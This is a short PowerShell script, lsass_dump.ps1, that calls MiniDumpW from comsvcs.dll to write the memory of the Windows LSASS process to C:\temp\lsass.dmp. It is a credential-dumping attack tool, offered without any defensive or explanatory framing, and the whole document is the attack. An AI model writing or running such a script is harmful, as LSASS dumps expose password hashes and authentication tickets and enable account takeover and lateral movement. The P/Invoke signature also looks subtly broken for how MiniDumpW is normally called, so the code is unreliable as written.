# lsass_dump.ps1

$dumpPath = "C:\temp\lsass.dmp"

# Load comsvcs.dll
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class DllImports {
    [DllImport("comsvcs.dll", SetLastError=true)]
    public static extern void MiniDumpW(IntPtr hProc, IntPtr hFile, int dumpType);
}
"@

# Get a handle to LSASS
$lsass = (Get-Process lsass).Handle

# Create or overwrite the dump file
$fs = [System.IO.File]::Create($dumpPath)

# Perform the dump
[DllImports]::MiniDumpW($lsass, $fs.SafeFileHandle.DangerousGetHandle(), 2)

# Close the file
$fs.Close()

Write-Host "LSASS dump completed: $dumpPath"

